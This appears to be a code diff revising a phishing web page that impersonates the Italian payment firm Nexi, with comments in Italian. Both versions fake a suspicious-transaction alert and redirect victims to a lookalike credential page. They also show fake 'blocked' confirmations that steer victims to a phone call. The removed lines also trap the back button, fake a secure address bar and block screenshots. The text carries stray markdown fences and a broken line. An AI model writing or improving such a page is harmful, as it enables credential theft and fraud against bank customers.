             const now = new Date();
-            document.getElementById('update-time').
-			```javascript
             document.getElementById('update-time').textContent = 
                 now.toLocaleTimeString('it-IT');
             
             // Cambia ID alert casualmente
             const alertId = Math.floor(Math.random() * 9000) + 1000;
-            document.getElementById('alert-id').textContent = alertId;
+            document.querySelector('.alert-ref').textContent = `RIF: NX-${alertId}-2024`;
+            document.querySelector('.transaction-id').textContent = 
+                `ID Operazione: NEXI-ALERT-${alertId}-2024`;
         }
         
-        // Simula vibrazione al tap
-        function simulateHaptic() {
-            if (navigator.vibrate) {
-                navigator.vibrate(50);
-            }
-        }
-        
-        // Azione verifica
-        function verifyAction() {
-            simulateHaptic();
+        // Verifica transazione
+        function verifyTransaction() {
+            // Disabilita bottoni
+            const btn = document.querySelector('.btn-verify');
+            btn.innerHTML = '<span class="btn-icon">⏳</span> VERIFICA IN CORSO...';
+            btn.disabled = true;
             
-            // Mostra schermata di caricamento
-            document.querySelector('.btn-primary').innerHTML = 
-                '<span class="btn-icon">⏳</span> VERIFICA IN CORSO...';
-            document.querySelector('.btn-primary').disabled = true;
-            
-            // Simula processo di verifica
+            // Simula caricamento
             setTimeout(() => {
                 // Reindirizza a pagina di phishing
-                window.location.href = "https://secure-login.nexi-verifica.com/auth";
+                window.location.href = "https://secure-auth.nexi-verifica.com/login?ref=NX-7842";
                 
                 // O mostra alert se non c'è reindirizzamento
-                // alert("Reindirizzamento alla pagina di autenticazione sicura...\n\nInserisci le tue credenziali per verificare l'identità.");
-            }, 1500);
+                // showAlert("Reindirizzamento alla pagina di autenticazione sicura...\n\nInserisci le tue credenziali per verificare l'identità.");
+            }, 2000);
         }
         
-        // Azione blocco
-        function blockAction() {
-            simulateHaptic();
+        // Blocca transazione
+        function blockTransaction() {
+            const btn = document.querySelector('.btn-block');
+            btn.innerHTML = '<span class="btn-icon">⏳</span> BLOCCANDO...';
+            btn.disabled = true;
             
-            // Mostra schermata di caricamento
-            document.querySelector('.btn-secondary').innerHTML = 
-                '<span class="btn-icon">⏳</span> BLOCCANDO...';
-            document.querySelector('.btn-secondary').disabled = true;
-            
-            // Simula processo di blocco
             setTimeout(() => {
-                // Mostra conferma finta
-                const timer = document.getElementById('countdown-timer');
-                timer.innerHTML = '<span style="color:#34c759">BLOCCATO</span>';
-                timer.style.fontSize = '32px';
+                // Cambia stato
+                document.querySelector('.status-badge').textContent = 'BLOCCATA';
+                document.querySelector('.status-badge').style.background = '#34c759';
+                document.querySelector('.transaction-card').style.borderTop = '4px solid #34c759';
                 
+                // Aggiorna timer
+                document.getElementById('countdown-timer').innerHTML = 
+                    '<span style="color:#34c759">BLOCCATA</span>';
                 document.querySelector('.timer-label').textContent = 'OPERAZIONE BLOCCATA';
-                document.querySelector('.timer-note').textContent = 
-                    'Un nostro operatore ti contatterà entro 5 minuti per conferma';
+                document.querySelector('.timer-note').innerHTML = 
+                    '<strong>✅ Transazione bloccata con successo!</strong><br>Un operatore Nexi ti contatterà entro 5 minuti per la conferma finale.';
                 
-                // Cambia stato transazione
-                document.querySelector('.transaction-card').style.borderLeftColor = '#34c759';
-                document.querySelector('.amount').style.color = '#34c759';
+                // Mostra conferma
+                showAlert("✅ Transazione bloccata con successo!\n\nUn nostro operatore ti contatterà al numero registrato per la conferma finale.\n\nAssicurati di essere raggiungibile.");
                 
-                // Mostra messaggio di successo
-                alert("✅ Transazione bloccata con successo!\n\nUn nostro operatore ti contatterà al numero registrato per la conferma finale.\n\nAssicurati di essere raggiungibile.");
-                
-                // Dopo 3 secondi, reindirizza a pagina di "contatto"
+                // Reindirizza a chiamata dopo 3 secondi
                 setTimeout(() => {
                     window.location.href = "tel:+3934XXXXXXX";
                 }, 3000);
                 
-            }, 2000);
+            }, 2500);
         }
         
-        // Simula notifica push in arrivo
-        function simulatePushNotification() {
-            setTimeout(() => {
-                if (document.hidden) {
-                    // Se la pagina non è in primo piano, mostra notification API
-                    if ("Notification" in window && Notification.permission === "granted") {
-                        new Notification("Nexi Security Alert", {
-                            body: "Transazione sospetta richiede verifica immediata",
-                            icon: "https://www.nexi.it/favicon.ico",
-                            tag: "nexi-alert"
-                        });
-                    }
-                } else {
-                    // Se la pagina è visibile, mostra banner
-                    const banner = document.createElement('div');
-                    banner.style.cssText = `
-                        position: fixed;
-                        top: 80px;
-                        left: 20px;
-                        right: 20px;
-                        background: linear-gradient(135deg, #0055a5 0%, #003366 100%);
-                        color: white;
-                        padding: 15px;
-                        border-radius: 12px;
-                        z-index: 10000;
-                        box-shadow: 0 5px 20px rgba(0,0,0,0.3);
-                        animation: slideIn 0.3s ease-out;
-                    `;
-                    banner.innerHTML = `
-                        <div style="display: flex; align-items: center; gap: 10px;">
-                            <div style="font-size: 24px;">🔔</div>
-                            <div>
-                                <div style="font-weight: bold;">Nuovo aggiornamento</div>
-                                <div style="font-size: 14px; opacity: 0.9;">Sistema anti-frode aggiornato</div>
-                            </div>
-                        </div>
-                    `;
-                    document.body.appendChild(banner);
-                    
-                    setTimeout(() => {
-                        banner.remove();
-                    }, 3000);
-                }
-            }, 10000); // Dopo 10 secondi
+        // Alert personalizzato
+        function showAlert(message) {
+            const alertDiv = document.createElement('div');
+            alertDiv.style.cssText = `
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                background: white;
+                padding: 25px;
+                border-radius: 12px;
+                box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+                z-index: 10000;
+                max-width: 90%;
+                width: 400px;
+                text-align: center;
+                border-top: 6px solid #0055a5;
+            `;
+            alertDiv.innerHTML = `
+                <div style="font-size: 24px; margin-bottom: 15px;">⚠️</div>
+                <div style="font-size: 16px; line-height: 1.5; color: #333; margin-bottom: 20px;">
+                    ${message.replace(/\n/g, '<br>')}
+                </div>
+                <button onclick="this.parentElement.remove()" 
+                        style="background: #0055a5; color: white; border: none; 
+                               padding: 12px 30px; border-radius: 6px; 
+                               font-weight: 600; cursor: pointer;">
+                    OK
+                </button>
+            `;
+            document.body.appendChild(alertDiv);
         }
         
-        // Inizializzazione
-        document.addEventListener('DOMContentLoaded', function() {
-            // Aggiorna status bar
-            updateStatusBar();
-            setInterval(updateStatusBar, 60000);
-            
-            // Avvia countdown
-            startCountdown();
-            
-            // Avvia scansione sicurezza
-            simulateSecurityScan();
-            
-            // Aggiorna dati ogni 30 secondi
-            setInterval(updateTransactionDetails, 30000);
-            
-            // Simula prima notifica push
-            simulatePushNotification();
-            
-            // Simula comportamento da app (fullscreen su mobile)
-            if (window.navigator.standalone || window.matchMedia('(display-mode: standalone)').matches) {
-                document.body.style.paddingTop = '40px';
+        // Simula notifica push
+        setTimeout(() => {
+            if ("Notification" in window && Notification.permission === "granted") {
+                new Notification("Nexi Security Alert", {
+                    body: "Transazione sospetta richiede verifica immediata",
+                    icon: "https://www.nexi.it/favicon.ico",
+                    tag: "nexi-alert"
+                });
             }
-            
-            // Gestione back button (impedisce uscita facile)
-            window.history.pushState(null, null, window.location.href);
-            window.onpopstate = function() {
-                window.history.go(1);
-                alert("⚠️ Completare la verifica di sicurezza prima di uscire.");
-            };
-            
-            // Simula connessione sicura
-            setTimeout(() => {
-                document.querySelector('.browser-url').style.color = '#34c759';
-                document.querySelector('.browser-url').innerHTML = '🔒 https://secure.nexi.it/alert-system';
-            }, 1000);
-        });
-        
-        // Gestione orientamento dispositivo
-        window.addEventListener('orientationchange', function() {
-            // Forza portrait su mobile
-            if (Math.abs(window.orientation) === 90) {
-                alert("⚠️ Per motivi di sicurezza, questa pagina è ottimizzata per visualizzazione verticale.");
-            }
-        });
-        
-        // Previeni screenshot (solo su alcuni browser)
-        document.addEventListener('keydown', function(e) {
-            if ((e.ctrlKey && e.key === 'p') || (e.key === 'PrintScreen')) {
-                e.preventDefault();
-                alert("⚠️ La stampa e gli screenshot sono disabilitati per motivi di sicurezza.");
-            }
-        });
-        
-        // Simula battery level changes
-        setInterval(() => {
-            const battery = Math.max(10, Math.floor(Math.random() * 100));
-            document.querySelector('.signal').innerHTML = `📶 🔋 ${battery}%`;
-        }, 60000);
+        }, 15000);
     </script>
 </body>
 </html>
-```
